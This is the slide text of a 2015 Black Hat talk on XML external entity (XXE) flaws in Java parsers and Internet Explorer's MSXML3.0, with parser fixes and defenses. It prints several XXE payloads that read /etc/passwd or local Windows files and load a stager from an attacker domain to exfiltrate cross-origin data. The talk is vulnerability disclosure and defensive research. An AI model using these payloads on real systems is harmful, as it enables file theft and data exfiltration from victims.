FileCry - The New Age of XXE

Xiaoran Wang & Sergey Gorbaty

August 6, 2015 Black Hat USA 2015

Agenda
 Background  Saga of one failed XXE defense  We need a bigger target!  Conclusions  Q&A

Background
"All external parameter entities are well-formed by definition" (http://www.w3.org/TR/REC-xml/#sec-external-ent)

XXE 101
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <foo>&xxe;</foo>

Past Presentations
 OWASP 2010 - XXE Attack  BH USA 2012 - XXE Tunneling in SAP  BH EU 2013 - XML OOB Data retrieval  DC 02139 - Advanced XXE Exploitation  ...

Why Are We Still Here?
 Not just your apps that need the fix!  Server and client tech that runs your app also
need a fix!

JDK Vuln Disclosed
Unspecified vulnerability in Oracle Java SE 6u81, 7u67, and 8u20; Java SE Embedded 7u60; and Jrockit R27.8.3 and R28.3.3 allows remote attackers to affect confidentiality via vectors related to JAXP.

In the beginning...
 There was an XMLInputFactory  And it had a wonderful feature  IS_SUPPORTING_EXTERNAL_ENTITIES  And its default value was  Unspecified

In the beginning...
 There was an XMLInputFactory  And it had a wonderful feature  IS_SUPPORTING_EXTERNAL_ENTITIES  And its default value was  Unspecified

It Could Be Set To False...
XMLInputFactory inputFactory = XMLInputFactory.newFactory();
inputFactory.setProperty( XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
But...

It Did NOT Work!

"Safe" Factory Demo

JDK Fragmentation
 How many of you still run JDK6?

JDK Fragmentation
 How many of you still run JDK6?  What about JDK7?

JDK Fragmentation
 How many of you still run JDK6?  What about JDK7?  How many do not run JDK8?

How to Exfiltrate Data?
 DNS OOB resolver  63 char limit for subdomain name  Only letters, numbers and hyphen allowed  Space, \t seem to work okay  Cannot parse % & #, null
 XML exception printing  Does not have the above limitations!

Causing Exceptions
 file, ftp, http, gopher, https, mailto  netdoc and jar are smarter
 can resolve relative URI  local file

XMLStreamException

Showing Exceptions
May not be a good idea...

Showing Exceptions
May not be a good idea...

But Wait...
 JDK7 has more XML parsers...  javax.xml.parsers.DocumentBuilderFactory  javax.xml.parsers.SaxParserFactory  TransformerFactory  Validator  SchemaFactory  Unmarshaller  SAXTransformerFactory  XPathExpression  XMLReader  XMLInputFactory

And More...
 Popular 3rd party parsers  org.apache.commons.digester.Digester  Woodstock  dom4j  XOM  ...

What Are We Dealing With?
 W/o ability to turn off external entities/DTD
 javax.xml.transform.TransformerFactory  javax.xml.validation.Validator  javax.xml.transform.sax.SAXTransformerFactory
 W/o features to set
 javax.xml.bind.Unmarshaller
 Supporting a resolver
 org.xml.sax.XMLReader  javax.xml.parsers.DocumentBuilder

Speaking of Resolvers
Eclipse Auto-generated Stub

Speaking of Resolvers (II)
CORRECT WAY

Universal Fix
 factory.setProperty(XMLConstants.ACCESS_E XTERNAL_DTD, "");
 disables protocols, e.g. http:, file:, jar:  http://openjdk.java.net/jeps/185

Bigger Target!
 So far XXE is a Web attack  Let's replicate it on native application!
 What's an native app that is used by billions of users?

Bigger Target!
 So far XXE is a Web attack  Let's replicate it on native application!
 What's an native app that is used by billions of users?
 Browsers  are used by a lot of people  parses a lot of XML

The history of browser XXEs
 Chrome/Safari  libxml2 XXE fixed in 2012  CVE-2013-0339
 Firefox  expat XXE fixed in 2012  CVE-2013-0341
 IE  MSXML XXE fixed in 2006 with v6

MSXML3.0
A living corpse still available in IE

MSXML3.0

MSXML3.0

MSXML3.0
 So why is the old MSXML3.0 still available in IE 11?  Compatibility  Quirk mode is a friend

JavaScript XML parsing 101
 IE's way  new ActiveXObject(`MSXML').loadXML (xml);
 Other browser's way  new DOMParser().parseFromString (xml, "application/xml");

Payload 1
Regular XML that tries to read cross origin, didn't work <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE export [ <!ELEMENT export (#PCDATA)> <!ENTITY % loot SYSTEM "http://www.victim.com/"> <!ENTITY % stager SYSTEM "http://test.attackerdomain.com/xxe/entity.xml"> %stager; ]> <export>&all;</export>

Demo
Standard Payload Does not Work

Bypass
 Same Origin Policy blocked us  How is same origin policy usually bypassed?

Bypass

Payload 2
Exfiltrate data cross-origin with redirects <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE export [ <!ELEMENT export (#PCDATA)> <!ENTITY % loot SYSTEM "http://test.attacker-domain.com/ redirect?site=http://www.victim.com/"> <!ENTITY % stager SYSTEM "http://test.attacker-domain.com/ xxe/entity.xml"> %stager; ]> <export>&all;</export>

Demo
Cross-origin XXE in IE

Payload 3
Exfiltrate data on local disk <?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE export [ <!ELEMENT export (#PCDATA)> <!ENTITY % loot SYSTEM "http://test.attacker-domain.com/ redirect?site=file:///windows/msdfmap.ini"> <!ENTITY % stager SYSTEM "http://test.attacker-domain.com/ xxe/entity.xml"> %stager; ]> <export>&all;</export>

Demo
Reading Disk Contents

Limitations
 Victim file/site cannot contain <,%,>,null-byte  meaning most HTML pages are not vulnerable  JSON pages are  binary files are not vulnerable
 Only works on Windows 7 and below  all IE versions though

Defenses
 Update to latest IE 11  Use Windows 8 and up

Conclusions
 XXE is a severe category of vulnerabilities that deserves more attention
 Other languages and products could be vulnerable too
 XML parsing libraries should be secure by default
